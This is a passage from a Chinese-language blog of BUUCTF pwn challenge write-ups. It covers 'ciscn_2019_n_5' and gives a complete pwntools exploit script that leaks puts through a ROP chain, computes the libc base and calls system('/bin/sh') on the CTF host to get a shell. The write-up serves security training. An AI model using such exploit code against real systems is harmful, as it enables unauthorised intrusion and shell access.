class="string">b&quot;Correct\n&quot;</span>,payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="0x13-ciscn-2019-n-5"><a href="#0x13-ciscn-2019-n-5" class="headerlink" title="0x13 ciscn_2019_n_5"></a>0x13 ciscn_2019_n_5</h2><p>查保护哩</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240725194719731-1213761943.png" alt="image-20240725194720338"></p>
<p>看了一下name的地址，在bss段中，read这块儿打不了溢出，原打算直接一遍打通的，read这块儿看样子是不行了，那只能是分两次打了，第一遍正常泄露地址找libc基址，然后第二遍直接构建rop链</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240725205532762-605705591.png" alt="image-20240725205533095"></p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25005</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn16&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">rdi_address = <span class="number">0x0000000000400713</span></span><br><span class="line">main_address = <span class="number">0x0000000000400636</span></span><br><span class="line">return_address = <span class="number">0x00000000004006AA</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;tell me your name\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(rdi_address)+p64(puts_got)+p64(puts_plt)+p64(main_address)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;What do you want to say to me?\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">puts_address = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_address))</span><br><span class="line"></span><br><span class="line">libc_address = puts_address - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_address = libc_address + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_address = libc_address + libc.search(<span class="string">&#x27;bin/sh\x00&#x27;</span>).__next__()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_address))</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;tell me your name\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>) +p64(return_address)+p64(rdi_address)+p64(bin_sh_address) + p64(system_address)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;What do you want to say to me?\n&quot;</span>,payload1)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>












  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">首页</a></li>
        
          <li><a href="/about/">关于</a></li>
        
          <li><a href="/archives/">归档</a></li>
        
          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn%E9%A2%98%E6%97%A5%E8%AE%B0-BUU-%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD%E3%80%82%E3%80%82%E3%80%82%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">pwn题日记[BUU]（持续更新中。。。）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-test-your-nc"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 test_your_nc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-rip"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 rip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-warmup-csaw-2016"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 warmup_csaw_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-ciscn-2019-n-1"><span class="toc-number">1.4.</span> <span class="toc-text">0x04 ciscn_2019_n_1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A"><span class="toc-number">1.4.1.</span> <span class="toc-text">方法一：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A"><span class="toc-number">1.4.2.</span> <span class="toc-text">方法二：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-pwn1-sctf-2016"><span class="toc-number">1.5.</span> <span class="toc-text">0x05 pwn1_sctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-jarvisoj-level0"><span class="toc-number">1.6.</span> <span class="toc-text">0x06 jarvisoj_level0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019-%E5%86%B3%E8%B5%9B-PWN5"><span class="toc-number">1.7.</span> <span class="toc-text">0x07 [第五空间2019 决赛]PWN5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-%E7%A9%BF%E6%8F%92%E4%B8%80%E9%81%93%E8%BF%99%E5%91%A8%E6%89%93awd%E9%81%87%E5%88%B0%E7%9A%84pwn%E9%A2%98"><span class="toc-number">1.8.</span> <span class="toc-text">0x08 (穿插一道这周打awd遇到的pwn题)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-jarvisoj-level2"><span class="toc-number">1.9.</span> <span class="toc-text">0x09 jarvisoj_level2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0A-ciscn-2019-n-8"><span class="toc-number">1.10.</span> <span class="toc-text">0x0A  ciscn_2019_n_8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0B-bjdctf-2020-babystack"><span class="toc-number">1.11.</span> <span class="toc-text">0x0B bjdctf_2020_babystack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0C-ciscn-2019-c-1"><span class="toc-number">1.12.</span> <span class="toc-text">0x0C ciscn_2019_c_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0D-get-started-3dsctf-2016"><span class="toc-number">1.13.</span> <span class="toc-text">0x0D get_started_3dsctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0E-jarvisoj-level2-x64"><span class="toc-number">1.14.</span> <span class="toc-text">0x0E jarvisoj_level2_x64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-HarekazeCTF2019-baby-rop"><span class="toc-number">1.15.</span> <span class="toc-text">0x10 [HarekazeCTF2019]baby_rop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11-others-shellcode"><span class="toc-number">1.16.</span> <span class="toc-text">0x11 others_shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x12-OGeek2019-babyrop"><span class="toc-number">1.17.</span> <span class="toc-text">0x12 [OGeek2019]babyrop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x13-ciscn-2019-n-5"><span class="toc-number">1.18.</span> <span class="toc-text">0x13 ciscn_2019_n_5</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://bananashipsbbq.github.io/2024/09/25/pwn%E9%A2%98%E6%97%A5%E8%AE%B0-BUU%E7%89%88/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://bananashipsbbq.github.io/2024/09/25/pwn%E9%A2%98%E6%97%A5%E8%AE%B0-BUU%E7%89%88/&text=pwn题日记-BUU版"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://bananashipsbbq.github.io/2024/09/25/pwn%E9%A2%98%E6%97%A5%E8%AE%B0-BUU%E7%89%88/&title=pwn题日记-BUU版"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bananashipsbbq.github.io/2024/09/25/pwn%E9%A2%98%E6%97%A5%E8%AE%B0-BUU%E7%89%88/&is_video=false&description=pwn题日记-BUU版"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=pwn题日记-BUU版&body=Check out this article: https://bananashipsbbq.github.io/2024/09/25/pwn%E9%A2%98%E6%97%A5%E8%AE%B0-BUU%E7%89%88/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://bananashipsbbq.github.io/2024/09/25/pwn%E9%A2%98%E6%97%A5%E8%AE%B0-BUU%E7%89%88/&title=pwn题日记-BUU版"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://bananashipsbbq.github.io/2024/09/25/pwn%E9%A2%98%E6%97%A5%E8%AE%B0-BUU%E7%89%88/&title=pwn题日记-BUU版"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://bananashipsbbq.github.io/2024/09/25/pwn%E9%A2%98%E6%97%A5%E8%AE%B0-BUU%E7%89%88/&title=pwn题日记-BUU版"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://bananashipsbbq.github.io/2024/09/25/pwn%E9%A2%98%E6%97%A5%E8%AE%B0-BUU%E7%89%88/&title=pwn题日记-BUU版"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://bananashipsbbq.github.io/2024/09/25/pwn%E9%A2%98%E6%97%A5%E8%AE%B0-BUU%E7%89%88/&name=pwn题日记-BUU版&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://bananashipsbbq.github.io/2024/09/25/pwn%E9%A2%98%E6%97%A5%E8%AE%B0-BUU%E7%89%88/&t=pwn题日记-BUU版"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2025
    bananaships
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="/archives/">归档</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功！");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
